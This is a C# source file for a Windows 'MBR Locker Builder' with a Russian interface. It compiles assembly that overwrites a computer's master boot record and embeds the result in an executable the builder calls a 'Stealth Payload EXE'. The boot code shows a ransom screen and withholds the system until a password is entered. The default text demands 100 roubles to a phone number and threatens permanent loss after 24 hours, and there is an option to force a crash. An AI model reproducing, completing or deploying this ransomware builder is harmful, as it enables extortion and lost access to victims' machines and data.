using System;
using System.Drawing;
using System.IO;
using System.Windows.Forms;
using System.Diagnostics;
using System.Text;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Linq;

namespace MbrLockerBuilder
{
    public class MainForm : Form
    {
        // WinAPI для работы с ресурсами
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr BeginUpdateResource(string pFileName, bool bDeleteExistingResources);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool UpdateResource(IntPtr hUpdate, string lpType, string lpName, ushort wLanguage, byte[] lpData, uint cbData);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool EndUpdateResource(IntPtr hUpdate, bool fDiscard);

        private TextBox txtTitle, txtBody, txtPassword;
        private ComboBox cmbTextColor, cmbBgColor;
        private CheckBox chkBSOD;
        private Button btnBuild;
        private PictureBox previewBox;
        private Label lblStatus;
        private SaveFileDialog saveFileDialog;

        public MainForm()
        {
            this.Text = "MBR Locker Builder";
            this.Size = new Size(1000, 750);
            this.BackColor = Color.FromArgb(10, 15, 10);
            this.ForeColor = Color.FromArgb(0, 255, 100);
            this.FormBorderStyle = FormBorderStyle.FixedSingle;
            this.MaximizeBox = false;
            this.StartPosition = FormStartPosition.CenterScreen;

            this.InitializeComponents();
            this.LoadDefaultValues();
            this.UpdatePreview();
        }

        private void InitializeComponents()
        {
            int y = 20;
            int leftLabel = 20;
            int leftControl = 180;
            int controlWidth = 400;

            Label lblTitle = new Label();
            lblTitle.Text = "Заголовок:";
            lblTitle.Left = leftLabel;
            lblTitle.Top = y;
            lblTitle.Width = 200;
            lblTitle.ForeColor = Color.FromArgb(0, 255, 100);
            lblTitle.Font = new Font("Consolas", 10, FontStyle.Bold);
            this.Controls.Add(lblTitle);

            this.txtTitle = new TextBox();
            this.txtTitle.Left = leftControl;
            this.txtTitle.Top = y;
            this.txtTitle.Width = controlWidth;
            this.txtTitle.BackColor = Color.FromArgb(20, 25, 20);
            this.txtTitle.ForeColor = Color.FromArgb(0, 255, 100);
            this.txtTitle.Font = new Font("Consolas", 10);
            this.txtTitle.BorderStyle = BorderStyle.FixedSingle;
            this.Controls.Add(this.txtTitle);
            y += 40;

            Label lblBody = new Label();
            lblBody.Text = "Текст:";
            lblBody.Left = leftLabel;
            lblBody.Top = y;
            lblBody.Width = 200;
            lblBody.ForeColor = Color.FromArgb(0, 255, 100);
            lblBody.Font = new Font("Consolas", 10, FontStyle.Bold);
            this.Controls.Add(lblBody);

            this.txtBody = new TextBox();
            this.txtBody.Left = leftControl;
            this.txtBody.Top = y;
            this.txtBody.Width = controlWidth;
            this.txtBody.Height = 120;
            this.txtBody.Multiline = true;
            this.txtBody.BackColor = Color.FromArgb(20, 25, 20);
            this.txtBody.ForeColor = Color.FromArgb(0, 255, 100);
            this.txtBody.Font = new Font("Consolas", 10);
            this.txtBody.BorderStyle = BorderStyle.FixedSingle;
            this.Controls.Add(this.txtBody);
            y += 140;

            Label lblPass = new Label();
            lblPass.Text = "Пароль:";
            lblPass.Left = leftLabel;
            lblPass.Top = y;
            lblPass.Width = 200;
            lblPass.ForeColor = Color.FromArgb(0, 255, 100);
            lblPass.Font = new Font("Consolas", 10, FontStyle.Bold);
            this.Controls.Add(lblPass);

            this.txtPassword = new TextBox();
            this.txtPassword.Left = leftControl;
            this.txtPassword.Top = y;
            this.txtPassword.Width = 200;
            this.txtPassword.BackColor = Color.FromArgb(20, 25, 20);
            this.txtPassword.ForeColor = Color.FromArgb(0, 255, 100);
            this.txtPassword.Font = new Font("Consolas", 10);
            this.txtPassword.BorderStyle = BorderStyle.FixedSingle;
            this.Controls.Add(this.txtPassword);
            y += 40;

            Label lblTextColor = new Label();
            lblTextColor.Text = "Цвет текста:";
            lblTextColor.Left = leftLabel;
            lblTextColor.Top = y;
            lblTextColor.Width = 150;
            lblTextColor.ForeColor = Color.FromArgb(0, 255, 100);
            lblTextColor.Font = new Font("Consolas", 10, FontStyle.Bold);
            this.Controls.Add(lblTextColor);

            this.cmbTextColor = new ComboBox();
            this.cmbTextColor.Left = leftControl;
            this.cmbTextColor.Top = y;
            this.cmbTextColor.Width = 120;
            this.cmbTextColor.BackColor = Color.FromArgb(20, 25, 20);
            this.cmbTextColor.ForeColor = Color.FromArgb(0, 255, 100);
            this.cmbTextColor.DropDownStyle = ComboBoxStyle.DropDownList;
            this.cmbTextColor.Font = new Font("Consolas", 10);
            this.cmbTextColor.Items.AddRange(new object[] { "Lime", "Red", "White", "Cyan", "Yellow", "Magenta" });
            this.cmbTextColor.SelectedIndex = 0;
            this.Controls.Add(this.cmbTextColor);

            Label lblBgColor = new Label();
            lblBgColor.Text = "Фон:";
            lblBgColor.Left = leftControl + 140;
            lblBgColor.Top = y;
            lblBgColor.Width = 50;
            lblBgColor.ForeColor = Color.FromArgb(0, 255, 100);
            lblBgColor.Font = new Font("Consolas", 10, FontStyle.Bold);
            this.Controls.Add(lblBgColor);

            this.cmbBgColor = new ComboBox();
            this.cmbBgColor.Left = leftControl + 190;
            this.cmbBgColor.Top = y;
            this.cmbBgColor.Width = 120;
            this.cmbBgColor.BackColor = Color.FromArgb(20, 25, 20);
            this.cmbBgColor.ForeColor = Color.FromArgb(0, 255, 100);
            this.cmbBgColor.DropDownStyle = ComboBoxStyle.DropDownList;
            this.cmbBgColor.Font = new Font("Consolas", 10);
            this.cmbBgColor.Items.AddRange(new object[] { "Black", "Blue", "Dark Red", "Dark Green" });
            this.cmbBgColor.SelectedIndex = 0;
            this.Controls.Add(this.cmbBgColor);
            y += 45;

            this.chkBSOD = new CheckBox();
            this.chkBSOD.Text = "Вызвать BSOD после перезаписи";
            this.chkBSOD.Left = leftControl;
            this.chkBSOD.Top = y;
            this.chkBSOD.Width = 350;
            this.chkBSOD.ForeColor = Color.FromArgb(0, 255, 100);
            this.chkBSOD.Font = new Font("Consolas", 10, FontStyle.Bold);
            this.chkBSOD.CheckAlign = ContentAlignment.MiddleLeft;
            this.Controls.Add(this.chkBSOD);
            y += 50;

            Label lblPreview = new Label();
            lblPreview.Text = "Предпросмотр (MBR):";
            lblPreview.Left = leftLabel;
            lblPreview.Top = y;
            lblPreview.Width = 250;
            lblPreview.ForeColor = Color.FromArgb(0, 255, 100);
            lblPreview.Font = new Font("Consolas", 10, FontStyle.Bold);
            this.Controls.Add(lblPreview);
            y += 30;

            this.previewBox = new PictureBox();
            this.previewBox.Left = leftControl;
            this.previewBox.Top = y;
            this.previewBox.Width = 640;
            this.previewBox.Height = 240;
            this.previewBox.BackColor = Color.Black;
            this.previewBox.BorderStyle = BorderStyle.FixedSingle;
            this.previewBox.SizeMode = PictureBoxSizeMode.StretchImage;
            this.Controls.Add(this.previewBox);
            y += 260;

            this.btnBuild = new Button();
            this.btnBuild.Text = "СОБРАТЬ MBR ЛОКЕР";
            this.btnBuild.Left = leftControl;
            this.btnBuild.Top = y;
            this.btnBuild.Width = 300;
            this.btnBuild.Height = 45;
            this.btnBuild.BackColor = Color.FromArgb(0, 60, 0);
            this.btnBuild.ForeColor = Color.FromArgb(0, 255, 100);
            this.btnBuild.FlatStyle = FlatStyle.Flat;
            this.btnBuild.Font = new Font("Consolas", 12, FontStyle.Bold);
            this.btnBuild.FlatAppearance.BorderColor = Color.FromArgb(0, 255, 100);
            this.btnBuild.Click += new EventHandler(this.BtnBuild_Click);
            this.Controls.Add(this.btnBuild);

            this.lblStatus = new Label();
            this.lblStatus.Text = "Готов";
            this.lblStatus.Left = leftControl + 320;
            this.lblStatus.Top = y + 10;
            this.lblStatus.Width = 450;
            this.lblStatus.ForeColor = Color.FromArgb(0, 200, 100);
            this.lblStatus.Font = new Font("Consolas", 10);
            this.Controls.Add(this.lblStatus);

            this.txtTitle.TextChanged += new EventHandler(this.OnTextChanged);
            this.txtBody.TextChanged += new EventHandler(this.OnTextChanged);
            this.txtPassword.TextChanged += new EventHandler(this.OnTextChanged);
            this.cmbTextColor.SelectedIndexChanged += new EventHandler(this.OnTextChanged);
            this.cmbBgColor.SelectedIndexChanged += new EventHandler(this.OnTextChanged);

            this.saveFileDialog = new SaveFileDialog();
        }

        private void LoadDefaultValues()
        {
            this.txtTitle.Text = "Компьютер заблокирован!";
            this.txtBody.Text = "Ваш компьютер заблокирован за использование нелегального ПО, включая чит ПО. Для разблокировки вашего компьютера необходимо отправить 100 рублей на номер +7xxxxxxxxxx, и вам приедет код разблокировки в сообщении. Внимание! В случае неуплаты в течение 24 часов компьютер будет невозможно восстановить.";
            this.txtPassword.Text = "48284dkf8";
        }

        private void OnTextChanged(object sender, EventArgs e)
        {
            this.UpdatePreview();
        }

        private void UpdatePreview()
        {
            if (this.previewBox == null) return;

            Bitmap bmp = new Bitmap(640, 240);
            using (Graphics g = Graphics.FromImage(bmp))
            {
                Color bgColor = Color.Black;
                switch (this.cmbBgColor.SelectedIndex)
                {
                    case 0: bgColor = Color.Black; break;
                    case 1: bgColor = Color.DarkBlue; break;
                    case 2: bgColor = Color.Maroon; break;
                    case 3: bgColor = Color.DarkGreen; break;
                }
                g.Clear(bgColor);

                g.DrawRectangle(new Pen(Color.FromArgb(80, 80, 80), 1), 5, 5, 630, 230);

                Color fgColor = Color.Lime;
                switch (this.cmbTextColor.SelectedIndex)
                {
                    case 0: fgColor = Color.Lime; break;
                    case 1: fgColor = Color.Red; break;
                    case 2: fgColor = Color.White; break;
                    case 3: fgColor = Color.Cyan; break;
                    case 4: fgColor = Color.Yellow; break;
                    case 5: fgColor = Color.Magenta; break;
                }

                using (Font font = new Font("Consolas", 11, FontStyle.Regular))
                using (Brush brush = new SolidBrush(fgColor))
                {
                    string title = this.txtTitle.Text.Trim();
                    if (string.IsNullOrEmpty(title)) title = "LOCKED";

                    string body = this.txtBody.Text.Trim();
                    if (string.IsNullOrEmpty(body)) body = "Computer is locked.";

                    string password = this.txtPassword.Text.Trim();
                    if (string.IsNullOrEmpty(password)) password = "********";

                    int x = 20;
                    int y = 20;

                    string border = "========================================";
                    g.DrawString(border, font, brush, x, y);
                    y += 20;

                    string titleLine = "     " + title + "     ";
                    g.DrawString(titleLine, font, brush, x, y);
                    y += 20;

                    g.DrawString(border, font, brush, x, y);
                    y += 25;

                    string[] bodyLines = body.Split(new[] { '\n' }, StringSplitOptions.RemoveEmptyEntries);
                    foreach (string line in bodyLines)
                    {
                        string wrapped = line.Trim();
                        while (wrapped.Length > 60)
                        {
                            int cut = 60;
                            if (cut > wrapped.Length) cut = wrapped.Length;
                            g.DrawString(wrapped.Substring(0, cut), font, brush, x, y);
                            y += 18;
                            wrapped = wrapped.Substring(cut);
                        }
                        if (wrapped.Length > 0)
                        {
                            g.DrawString(wrapped, font, brush, x, y);
                            y += 18;
                        }
                    }

                    y += 5;
                    g.DrawString("Password: ", font, brush, x, y);

                    string visiblePassword = password;
                    SizeF passSize = g.MeasureString(visiblePassword, font);
                    g.DrawString(visiblePassword, font, brush, x + 110, y);

                    y += 20;
                    g.DrawString("█", font, new SolidBrush(Color.White), x + 110 + passSize.Width + 2, y - 20);
                }
            }
            this.previewBox.Image = bmp;
        }

        // ============================================================
        // МЕТОДЫ ДЛЯ ПОДДЕРЖКИ РУССКОГО ЯЗЫКА
        // ============================================================

        private string ConvertToDosHex(string text)
        {
            if (string.IsNullOrEmpty(text)) return "";
            
            try
            {
                Encoding dos = Encoding.GetEncoding(866);
                byte[] bytes = dos.GetBytes(text);
                return string.Join(", ", bytes.Select(b => "0x" + b.ToString("X2")));
            }
            catch
            {
                byte[] bytes = Encoding.ASCII.GetBytes(text);
                return string.Join(", ", bytes.Select(b => "0x" + b.ToString("X2")));
            }
        }

        private bool ContainsRussian(string text)
        {
            if (string.IsNullOrEmpty(text)) return false;
            return text.Any(c => (c >= 'А' && c <= 'я') || c == 'Ё' || c == 'ё');
        }

        // ============================================================
        // ОСНОВНЫЕ МЕТОДЫ
        // ============================================================

        private void BtnBuild_Click(object sender, EventArgs e)
        {
            try
            {
                if (ContainsRussian(this.txtPassword.Text))
                {
                    DialogResult result = MessageBox.Show(
                        "⚠️ Пароль содержит русские буквы!\n\n" +
                        "BIOS не поддерживает русские буквы в пароле.\n" +
                        "Пользователь не сможет ввести русский пароль.\n\n" +
                        "Рекомендуется использовать только:\n" +
                        "- Латинские буквы (A-Z, a-z)\n" +
                        "- Цифры (0-9)\n" +
                        "- Спецсимволы (!@#$%^&*)\n\n" +
                        "Продолжить с текущим паролем?",
                        "Предупреждение",
                        MessageBoxButtons.YesNo,
                        MessageBoxIcon.Warning
                    );
                    
                    if (result == DialogResult.No)
                        return;
                }

                this.lblStatus.Text = "1/7 Поиск ресурсов...";
                Application.DoEvents();

                string nasmPath = FindResourceByPartialName("nasm", "nasm.exe");
                if (string.IsNullOrEmpty(nasmPath))
                {
                    string localNasm = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "nasm.exe");
                    if (File.Exists(localNasm))
                        nasmPath = localNasm;
                    else
                        throw new Exception("NASM не найден!");
                }

                this.lblStatus.Text = "2/7 Компиляция MBR...";
                Application.DoEvents();

                string mbrAsm = this.GenerateMBR();
                string mbrPath = Path.Combine(Path.GetTempPath(), "mbr.asm");
                File.WriteAllText(mbrPath, mbrAsm, Encoding.ASCII);

                string mbrBinPath = Path.Combine(Path.GetTempPath(), "mbr.bin");
                RunNasm(nasmPath, mbrPath, mbrBinPath);
                byte[] mbrBytes = File.ReadAllBytes(mbrBinPath);
                if (mbrBytes.Length != 512)
                    throw new Exception($"MBR size: {mbrBytes.Length} != 512");

                this.lblStatus.Text = "3/7 Компиляция Stage2...";
                Application.DoEvents();

                string stage2Asm = this.GenerateStage2();
                string stage2Path = Path.Combine(Path.GetTempPath(), "stage2.asm");
                File.WriteAllText(stage2Path, stage2Asm, Encoding.ASCII);

                string stage2BinPath = Path.Combine(Path.GetTempPath(), "stage2.bin");
                RunNasm(nasmPath, stage2Path, stage2BinPath);
                byte[] stage2Bytes = File.ReadAllBytes(stage2BinPath);

                this.lblStatus.Text = "4/7 Сборка образа...";
                Application.DoEvents();

                int totalSectors = 16;
                byte[] fullImage = new byte[512 * totalSectors];
                
                Array.Copy(mbrBytes, 0, fullImage, 0, 512);
                Array.Copy(stage2Bytes, 0, fullImage, 512 * 3, stage2Bytes.Length);
                
                // ============================================================
// ЗАПИСЫВАЕМ ТЕКСТ В ОТДЕЛЬНЫЕ СЕКТОРА (4, 5, 6)
// ============================================================

string title = this.txtTitle.Text.Trim();
string body = this.txtBody.Text.Trim();
if (string.IsNullOrEmpty(title)) title = "LOCKED";
if (string.IsNullOrEmpty(body)) body = "Computer is locked.";

// Убираем рамки, оставляем только заголовок
string formattedTitle = "     " + title + "     \r\n";
// Добавляем \0 в конец, чтобы print остановился
string formattedBody = body.Replace("\n", "\r\n") + "\0";

byte[] titleBytes = Encoding.GetEncoding(866).GetBytes(formattedTitle);
if (titleBytes.Length > 512) Array.Resize(ref titleBytes, 512);
Array.Copy(titleBytes, 0, fullImage, 512 * 4, titleBytes.Length);

byte[] bodyBytes = Encoding.GetEncoding(866).GetBytes(formattedBody);
if (bodyBytes.Length > 512 * 2) Array.Resize(ref bodyBytes, 512 * 2);
Array.Copy(bodyBytes, 0, fullImage, 512 * 5, bodyBytes.Length);

                this.lblStatus.Text = "5/7 Получение template.exe...";
                Application.DoEvents();

                byte[] templateBytes = FindResourceBytesByPartialName("template");
                if (templateBytes == null)
                {
                    string localTemplate = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "template.exe");
                    if (File.Exists(localTemplate))
                        templateBytes = File.ReadAllBytes(localTemplate);
                    else
                        throw new Exception("template.exe не найден!");
                }

                this.lblStatus.Text = "6/7 Встраивание MBR как ресурс...";
                Application.DoEvents();

                string tempTemplatePath = Path.Combine(Path.GetTempPath(), "template_temp.exe");
                File.WriteAllBytes(tempTemplatePath, templateBytes);

                string outputPath = Path.Combine(Path.GetTempPath(), "payload_temp.exe");
                File.Copy(tempTemplatePath, outputPath, true);

                IntPtr hUpdate = BeginUpdateResource(outputPath, false);
                if (hUpdate == IntPtr.Zero)
                    throw new Exception("Не удалось открыть файл для обновления ресурсов!");

                if (!UpdateResource(hUpdate, "BINARY", "MBR", 0, fullImage, (uint)fullImage.Length))
                {
                    EndUpdateResource(hUpdate, true);
                    throw new Exception("Не удалось добавить ресурс MBR!");
                }

                if (this.chkBSOD.Checked)
                {
                    byte[] bsodData = new byte[1] { 0x01 };
                    if (!UpdateResource(hUpdate, "RT_RCDATA", "BSOD", 0, bsodData, 1))
                    {
                        EndUpdateResource(hUpdate, true);
                        throw new Exception("Не удалось добавить ресурс BSOD!");
                    }
                }

                if (!EndUpdateResource(hUpdate, false))
                    throw new Exception("Не удалось сохранить файл!");

                byte[] payloadBytes = File.ReadAllBytes(outputPath);

                try { File.Delete(tempTemplatePath); } catch { }
                try { File.Delete(outputPath); } catch { }

                this.lblStatus.Text = "7/7 Сохранение...";
                Application.DoEvents();

                this.saveFileDialog.Title = "Сохранить Stealth Payload EXE";
                this.saveFileDialog.Filter = "Executable (*.exe)|*.exe";
                if (this.saveFileDialog.ShowDialog() == DialogResult.OK)
                {
                    File.WriteAllBytes(this.saveFileDialog.FileName, payloadBytes);
                    this.lblStatus.Text = "Готово: " + Path.GetFileName(this.saveFileDialog.FileName);

                    MessageBox.Show("Mbr locker создан!", "Успех", MessageBoxButtons.OK, MessageBoxIcon.Information);
                }
                else
                {
                    this.lblStatus.Text = "Отменено";
                }

                try { File.Delete(mbrPath); } catch { }
                try { File.Delete(mbrBinPath); } catch { }
                try { File.Delete(stage2Path); } catch { }
                try { File.Delete(stage2BinPath); } catch { }
                if (nasmPath.StartsWith(Path.GetTempPath())) { try { File.Delete(nasmPath); } catch { } }
            }
            catch (Exception ex)
            {
                this.lblStatus.Text = "Ошибка: " + ex.Message;
                MessageBox.Show("Ошибка сборки:\n" + ex.Message,
                    "Ошибка", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private void RunNasm(string nasmPath, string asmPath, string binPath)
        {
            Process nasm = new Process();
            nasm.StartInfo.FileName = nasmPath;
            nasm.StartInfo.Arguments = $"-f bin -o \"{binPath}\" \"{asmPath}\"";
            nasm.StartInfo.UseShellExecute = false;
            nasm.StartInfo.RedirectStandardOutput = true;
            nasm.StartInfo.RedirectStandardError = true;
            nasm.StartInfo.CreateNoWindow = true;
            nasm.Start();
            nasm.WaitForExit();
            if (nasm.ExitCode != 0)
                throw new Exception("NASM Error: " + nasm.StandardError.ReadToEnd());
        }

        // ============================================================
        // НОВЫЕ МЕТОДЫ ДЛЯ ЗАГРУЗКИ ASM ИЗ РЕСУРСОВ
        // ============================================================

        private string GenerateMBR()
        {
            // 1. Пробуем загрузить из встроенных ресурсов (внутри EXE)
            try
            {
                using (Stream stream = Assembly.GetExecutingAssembly().GetManifestResourceStream("MbrLockerBuilder.Resources.mbr.asm"))
                {
                    if (stream != null)
                    {
                        using (StreamReader reader = new StreamReader(stream))
                        {
                            return reader.ReadToEnd();
                        }
                    }
                }
            }
            catch { }

            // 2. Если не вышло — ищем в папке locker (для отладки)
            string localPath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "locker", "mbr.asm");
            if (File.Exists(localPath))
                return File.ReadAllText(localPath);

            // 3. Запасной вариант (встроенный шаблон)
            return @"
BITS 16
ORG 0x7C00

start:
    cli
    cld
    xor ax, ax
    mov ds, ax
    mov es, ax
    mov ss, ax
    mov sp, 0x7C00
    sti

    mov ax, 0x0000
    mov es, ax
    mov bx, 0x8000
    mov ah, 0x02
    mov al, 6
    mov ch, 0
    mov cl, 3
    mov dh, 0
    mov dl, 0x80
    int 0x13
    jc load_error

    jmp 0x0000:0x8000

load_error:
    mov si, msg_error
    call print
    jmp hang

print:
    lodsb
    or al, al
    jz .done
    mov ah, 0x0E
    int 0x10
    jmp print
.done:
    ret

hang:
    cli
    hlt
    jmp hang

msg_error:
    db 'Load error!', 0

times 510 - ($ - $$) db 0
dw 0xAA55";
        }

        private string GenerateStage2()
{
    string template = null;

    try
    {
        using (Stream stream = Assembly.GetExecutingAssembly().GetManifestResourceStream("MbrLockerBuilder.Resources.stage2.asm"))
        {
            if (stream != null)
            {
                using (StreamReader reader = new StreamReader(stream))
                {
                    template = reader.ReadToEnd();
                }
            }
        }
    }
    catch { }

    if (string.IsNullOrEmpty(template))
    {
        string localPath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "locker", "stage2.asm");
        if (File.Exists(localPath))
            template = File.ReadAllText(localPath);
    }

    if (string.IsNullOrEmpty(template))
    {
        template = @"
BITS 16
ORG 0x8000

start_stage2:
    mov ax, 0x0003
    int 0x10

    mov ah, 0x06
    mov al, 0
    mov bh, 0x00
    mov cx, 0
    mov dx, 0x184F
    int 0x10

    mov ax, {TEXT_COLOR}
    int 0x10

    mov ax, 0x0000
    mov es, ax
    mov bx, 0x9000
    mov ah, 0x02
    mov al, 1
    mov ch, 0
    mov cl, 4
    mov dh, 0
    mov dl, 0x80
    int 0x13
    jc load_error

    mov si, 0x9000
    call print

    mov ax, 0x0000
    mov es, ax
    mov bx, 0x9200
    mov ah, 0x02
    mov al, 2
    mov ch, 0
    mov cl, 5
    mov dh, 0
    mov dl, 0x80
    int 0x13
    jc load_error

    mov si, 0x9200
    call print

    mov ah, 0x02
    mov bh, 0x00
    mov dh, 24
    mov dl, 0
    int 0x10

    mov si, msg_prompt
    call print

password_loop:
    call get_password
    call check_password
    cmp byte [password_ok], 1
    je restore_and_boot
    
    mov si, msg_wrong
    call print
    jmp password_loop

load_error:
    mov si, msg_error
    call print
    jmp hang

restore_and_boot:
    call restore_mbr
    jmp load_os

restore_mbr:
    pusha
    mov ax, 0x0000
    mov es, ax
    mov bx, 0x7E00
    mov ah, 0x02
    mov al, 1
    mov ch, 0
    mov cl, 2
    mov dh, 0
    mov dl, 0x80
    int 0x13
    jc .error

    mov ah, 0x03
    mov al, 1
    mov cl, 1
    int 0x13
.error:
    popa
    ret

load_os:
    mov ax, 0x0000
    mov es, ax
    mov bx, 0x7C00
    mov ah, 0x02
    mov al, 1
    mov cl, 1
    int 0x13
    jmp 0x0000:0x7C00

print:
    lodsb
    or al, al
    jz .done
    mov ah, 0x0E
    int 0x10
    jmp print
.done:
    ret

get_password:
    mov di, buffer
    mov cx, 64
.loop:
    xor ax, ax
    int 0x16
    cmp al, 0x0D
    je .done
    cmp al, 0x08
    je .backspace
    cmp di, buffer + 64
    je .loop
    stosb
    mov ah, 0x0E
    mov al, [di - 1]
    int 0x10
    jmp .loop
.backspace:
    cmp di, buffer
    je .loop
    dec di
    mov ah, 0x0E
    mov al, 0x08
    int 0x10
    mov al, ' '
    int 0x10
    mov al, 0x08
    int 0x10
    jmp .loop
.done:
    mov byte [di], 0
    ret

check_password:
    mov si, buffer
    mov di, password
.compare:
    lodsb
    or al, al
    jz .check_end
    cmpsb
    jne .fail
    jmp .compare
.check_end:
    cmp byte [di], 0
    jne .fail
    mov byte [password_ok], 1
.fail:
    ret

hang:
    cli
    hlt
    jmp hang

msg_prompt:
    db 'Password: ',0

msg_wrong:
    db 13,10,'Wrong password!',13,10,0

msg_error:
    db 'Load error!',0

password:
    db {PASSWORD_HEX}

buffer:
    times 64 db 0

password_ok:
    db 0";
    }

    string password = this.txtPassword.Text.Trim();
    if (string.IsNullOrEmpty(password)) password = "admin";

    string passwordHex;
    if (ContainsRussian(password))
    {
        string cleanPassword = new string(password.Where(c => c < 128).ToArray());
        if (string.IsNullOrEmpty(cleanPassword)) cleanPassword = "admin";
        passwordHex = string.Join(", ", Encoding.ASCII.GetBytes(cleanPassword).Select(b => "0x" + b.ToString("X2")));
    }
    else
    {
        passwordHex = string.Join(", ", Encoding.ASCII.GetBytes(password).Select(b => "0x" + b.ToString("X2")));
    }

    template = template.Replace("{PASSWORD_HEX}", passwordHex + ", 0x00");

    string textColor = "0A";
    switch (this.cmbTextColor.SelectedIndex)
    {
        case 0: textColor = "0A"; break;
        case 1: textColor = "0C"; break;
        case 2: textColor = "0F"; break;
        case 3: textColor = "0B"; break;
        case 4: textColor = "0E"; break;
        case 5: textColor = "0D"; break;
    }

    string bgColor = "00";
    switch (this.cmbBgColor.SelectedIndex)
    {
        case 0: bgColor = "00"; break;
        case 1: bgColor = "10"; break;
        case 2: bgColor = "40"; break;
        case 3: bgColor = "20"; break;
    }

    bool enableBSOD = this.chkBSOD.Checked;

    template = template.Replace("mov bh, 0x00", "mov bh, 0x" + bgColor);
    template = template.Replace("{TEXT_COLOR}", "0x" + textColor + "00");

    if (enableBSOD)
    {
        template = template.Replace("jmp hang", "int 0x19");
    }

    return template;
}

        private string FindResourceByPartialName(string partialName, string fileName)
        {
            try
            {
                string[] allResources = Assembly.GetExecutingAssembly().GetManifestResourceNames();
                string foundName = null;
                foreach (string name in allResources)
                {
                    if (name.IndexOf(partialName, StringComparison.OrdinalIgnoreCase) >= 0)
                    {
                        foundName = name;
                        break;
                    }
                }

                if (string.IsNullOrEmpty(foundName))
                {
                    this.lblStatus.Text = $"Ресурс '{partialName}' не найден!";
                    return null;
                }

                string tempPath = Path.Combine(Path.GetTempPath(), fileName);
                using (Stream stream = Assembly.GetExecutingAssembly().GetManifestResourceStream(foundName))
                {
                    if (stream == null)
                        throw new Exception($"Ресурс {foundName} не найден!");

                    using (FileStream fs = new FileStream(tempPath, FileMode.Create, FileAccess.Write))
                    {
                        stream.CopyTo(fs);
                    }
                }
                return tempPath;
            }
            catch (Exception ex)
            {
                this.lblStatus.Text = $"Ошибка: {ex.Message}";
                return null;
            }
        }

        private byte[] FindResourceBytesByPartialName(string partialName)
        {
            try
            {
                string[] allResources = Assembly.GetExecutingAssembly().GetManifestResourceNames();
                string foundName = null;
                foreach (string name in allResources)
                {
                    if (name.IndexOf(partialName, StringComparison.OrdinalIgnoreCase) >= 0)
                    {
                        foundName = name;
                        break;
                    }
                }

                if (string.IsNullOrEmpty(foundName))
                {
                    this.lblStatus.Text = $"Ресурс '{partialName}' не найден!";
                    return null;
                }

                using (Stream stream = Assembly.GetExecutingAssembly().GetManifestResourceStream(foundName))
                {
                    if (stream == null)
                        throw new Exception($"Ресурс {foundName} не найден!");

                    using (MemoryStream ms = new MemoryStream())
                    {
                        stream.CopyTo(ms);
                        return ms.ToArray();
                    }
                }
            }
            catch (Exception ex)
            {
                this.lblStatus.Text = $"Ошибка: {ex.Message}";
                return null;
            }
        }
    }
}
